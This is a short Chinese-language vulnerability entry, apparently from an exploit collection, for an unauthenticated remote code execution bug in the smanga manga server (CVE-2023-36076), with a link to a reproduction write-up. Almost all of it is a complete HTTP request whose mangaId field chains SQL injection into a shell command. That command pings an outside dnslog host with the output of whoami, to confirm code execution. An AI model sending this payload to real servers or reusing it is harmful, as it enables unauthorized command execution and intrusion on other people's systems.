##  smanga存在未授权远程代码执行漏洞 CVE-2023-36076

```
POST /php/manga/delete.php HTTP/1.1
Host: 127.0.0.1:8181
Content-Length: 360
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Origin: http://127.0.0.1:8181
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (iPad; CPU OS 13_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/87.0.4280.77 Mobile/15E148 Safari/604.1
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://127.0.0.1:8181/php/manga/delete.php
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Connection: close

mangaId=1+union+select+*+from+%28select+1%29a+join+%28select+2%29b+join+%28select+3%29c+join+%28select+4%29d+join+%28select+%27%5C%22%3Bping+-c+3+%60whoami%60.uoi9vt.dnslog.cn%3B%5C%22%27%29e+join+%28select+6%29f+join+%28select+7%29g+join+%28select+8%29h+join+%28select+9%29i+join+%28select+10%29j+join+%28select+11%29k+join+%28select+12%29l%3B&deleteFile=true
```

## 漏洞复现
https://mp.weixin.qq.com/s?__biz=MzI1NTM4ODIxMw==&mid=2247499614&idx=1&sn=96043db01ebaf64197a14fbb095a89cd&chksm=ea340004dd438912d010a45c78284e9b877fa00a08ad3834f38c0f7e5bf97ba577ca72f01321&scene=0&xtrack=1#rd
